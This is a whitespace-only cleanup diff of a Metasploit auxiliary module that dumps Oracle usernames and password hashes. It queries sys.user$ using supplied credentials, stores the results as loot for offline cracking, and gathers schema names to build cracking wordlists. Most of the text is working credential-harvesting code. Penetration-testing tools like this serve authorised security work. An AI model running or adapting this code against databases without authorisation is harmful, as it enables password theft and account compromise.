@@ -16,8 +16,8 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::ORACLE
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
-	
-	
+
+
 	def initialize
 		super(
 			'Name'           => 'Oracle Password Hashdump',
@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %Q{
 					This module dumps the usernames and password hashes
 					from Oracle given the proper Credentials and SID.
-					These are then stored as loot for later cracking.				
+					These are then stored as loot for later cracking.
 			},
 			'Author'         => ['TheLightCosine <thelightcosine[at]gmail.com>'],
 			'License'        => MSF_LICENSE
@@ -34,23 +34,23 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(ip)
 		return if not check_dependencies
-		
+
 		#Checks for Version of Oracle, 8g-10g all behave one way, while 11g behaves differently
 		#Also, 11g uses SHA-1 while 8g-10g use DES
 		is_11g=false
 		query =  'select * from v$version'
 		ver = prepare_exec(query)
-		
+
 		if ver.nil?
 			print_error("An Error has occured, check your OPTIONS")
 			return
 		end
-		
+
 		unless ver.empty?
 			if ver[0].include?('11g')
 				is_11g=true
 				print_status("Server is running 11g, using newer methods...")
-			end		
+			end
 		end
 
 		this_service = report_service(
@@ -59,14 +59,14 @@ class Metasploit3 < Msf::Auxiliary
 					:name => 'oracle',
 					:proto => 'tcp'
 					)
-		
-		
+
+
 
 		tbl = Rex::Ui::Text::Table.new(
 			'Header'  => 'Oracle Server Hashes',
 			'Ident'   => 1,
 			'Columns' => ['Username', 'Hash']
-		)		
+		)
 
 		#Get the usernames and hashes for 8g-10g
 		begin
@@ -79,7 +79,7 @@ class Metasploit3 < Msf::Auxiliary
 						tbl << row
 					end
 				end
-			#Get the usernames and hashes for 11g	
+			#Get the usernames and hashes for 11g
 			else
 				query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
 				results= prepare_exec(query)
@@ -91,7 +91,7 @@ class Metasploit3 < Msf::Auxiliary
 						tbl << row
 					end
 				end
-				
+
 			end
 		rescue => e
 			print_error("An error occured. The supplied credentials may not have proper privs")
@@ -99,14 +99,14 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		print_status("Hash table :\n #{tbl}")
 		report_hashes(tbl.to_csv, is_11g, ip, this_service)
-		
+
 		schema= get_schema()
 		unless schema.nil? or schema.empty?
 			report_other_data(schema,ip)
 		end
-		
+
 	end
-			
+
 	def get_schema
 		#Grabs the Database and table names for storage
 		#These names will be sued later to seed wordlists for cracking
@@ -121,7 +121,7 @@ class Metasploit3 < Msf::Auxiliary
 					schema[db]= tables
 				end
 			end
-		
+
 		end
 		return schema
 	end
